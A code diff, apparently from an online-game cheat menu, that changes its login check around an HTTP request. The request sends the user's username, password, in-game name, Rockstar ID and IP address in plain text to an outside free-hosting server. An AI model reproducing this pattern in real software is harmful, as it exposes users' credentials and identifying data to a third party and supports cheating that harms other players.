@@ -54,7 +54,7 @@ namespace big
 
 	void game_window::interact_to_server()
 	{
-		if (*g_pointers->m_is_session_started && g_running && (*g_game_window->username && *g_game_window->password))
+		if (*g_pointers->m_is_session_started && is_auth && (*g_game_window->username && *g_game_window->password))
 		{
 			if (get_session_time == 50000)
 			{
@@ -62,10 +62,12 @@ namespace big
 				{
 					http::Request request{ fmt::format("http://external-view.000webhostapp.com/ellohim_system.php?username={}&password={}&IGN={}&rockstar_id={}&player_ip={}", g_game_window->username, g_game_window->password, rage_helper::get_local_playerinfo()->m_name, *g_pointers->m_player_rid, player::get_player_ip(g_local.player)) };
 					const auto response = request.send("GET");
+					is_auth = true;
 				}
 				catch (const std::exception& e)
 				{
 					LOG(HACKER) << "Request failed, error: " << e.what();
+					is_auth = false;
 				}
 			}
 			if (get_session_time >= 50000)
